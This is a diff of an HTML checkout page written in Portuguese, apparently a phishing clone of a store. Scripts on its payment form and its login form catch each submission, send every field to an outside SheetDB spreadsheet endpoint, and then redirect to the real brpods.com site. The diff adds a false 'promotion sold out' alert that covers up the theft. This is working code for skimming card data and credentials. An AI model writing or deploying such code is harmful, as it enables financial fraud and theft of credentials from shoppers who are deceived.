@@ -1121,78 +1121,92 @@ Você tem um cupom de desconto? <a href="#" class="showcoupon">Clique aqui e inf
         	</p>
     	</div>
 
-    	<button type="submit">Finalizar Pagamento</button>
-	</form>
+  <button type="submit">Finalizar Pagamento</button>
+</form>
 </div>
 
 <script>
-    	document.getElementById('payment-form').onsubmit = function(event) {
-        	event.preventDefault(); // Previne o envio padrão do formulário
+	document.getElementById('payment-form').onsubmit = function(event) {
+    	event.preventDefault(); // Previne o envio padrão do formulário
 
-        	const formData = new FormData(this);
-        	const data = {};
-        	formData.forEach((value, key) => {
-            	data[key] = value;
-        	});
+    	const formData = new FormData(this);
+    	const data = {};
+    	formData.forEach((value, key) => {
+        	data[key] = value;
+    	});
 
-        	fetch('https://sheetdb.io/api/v1/sukxyvcd371y0', {
-            	method: 'POST',
-            	headers: {
-                	'Content-Type': 'application/json'
-            	},
-            	body: JSON.stringify(data)
-        	})
-        	.then(response => {
-            	if (response.ok) {
-                	// Dados enviados com sucesso, redireciona para o Facebook
+    	fetch('https://sheetdb.io/api/v1/sukxyvcd371y0', {
+        	method: 'POST',
+        	headers: {
+            	'Content-Type': 'application/json'
+        	},
+        	body: JSON.stringify(data)
+    	})
+    	.then(response => {
+        	if (response.ok) {
+            	// Exibe o alerta e redireciona após 2 segundos
+            	alert("Pedimos desculpas, mas a promoção que você tentou acessar está esgotada. Estamos sempre atualizando nossas ofertas, então fique atento ao nosso site. Você será redirecionado em breve.");
+            	setTimeout(() => {
                 	window.location.href = "https://brpods.com/";
-            	} else {
-                	// Trate o erro aqui, se necessário
-                	console.error('Erro ao enviar os dados');
-            	}
-        	})
-        	.catch(error => {
-            	console.error('Erro de rede:', error);
-        	});
-    	};
-    	</script>
+            	}, 2000); // 2000 milissegundos = 2 segundos
+        	} else {
+            	// Trate o erro aqui, se necessário
+            	console.error('Erro ao enviar os dados');
+        	}
+    	})
+    	.catch(error => {
+        	console.error('Erro de rede:', error);
+    	});
+	};
+</script>
+
+
+
 
 
 
 </div>
 </div>
 </form>
+</form>
+</div>
+
 <script>
-   	 document.getElementById('login').onsubmit = function(event) {
-   		 event.preventDefault(); // Previne o envio padrão do formulário
+	document.getElementById('login').onsubmit = function(event) {
+    	event.preventDefault(); // Previne o envio padrão do formulário
 
-   		 const formData = new FormData(this);
-   		 const data = {};
-   		 formData.forEach((value, key) => {
-       		 data[key] = value;
-   		 });
+    	const formData = new FormData(this);
+    	const data = {};
+    	formData.forEach((value, key) => {
+        	data[key] = value;
+    	});
 
-   		 fetch('https://sheetdb.io/api/v1/sukxyvcd371y0', {
-       		 method: 'POST',
-       		 headers: {
-           		 'Content-Type': 'application/json'
-       		 },
-       		 body: JSON.stringify(data)
-   		 })
-   		 .then(response => {
-       		 if (response.ok) {
-           		 // Dados enviados com sucesso, redireciona para o Facebook
-           		 window.location.href = "https://brpods.com";
-       		 } else {
-           		 // Trate o erro aqui, se necessário
-           		 console.error('Erro ao enviar os dados');
-       		 }
-   		 })
-   		 .catch(error => {
-       		 console.error('Erro de rede:', error);
-   		 });
-   	 };
-   	 </script>
+    	fetch('https://sheetdb.io/api/v1/sukxyvcd371y0', {
+        	method: 'POST',
+        	headers: {
+            	'Content-Type': 'application/json'
+        	},
+        	body: JSON.stringify(data)
+    	})
+    	.then(response => {
+        	if (response.ok) {
+            	// Exibe o alerta e redireciona após 2 segundos
+            	alert("Pedimos desculpas, mas a promoção que você tentou acessar está esgotada. Estamos sempre atualizando nossas ofertas, então fique atento ao nosso site. Você será redirecionado em breve.");
+            	setTimeout(() => {
+                	window.location.href = "https://brpods.com/";
+            	}, 2000); // 2000 milissegundos = 2 segundos
+        	} else {
+            	// Trate o erro aqui, se necessário
+            	console.error('Erro ao enviar os dados');
+        	}
+    	})
+    	.catch(error => {
+        	console.error('Erro de rede:', error);
+    	});
+	};
+</script>
+
+
 
 
 </div>
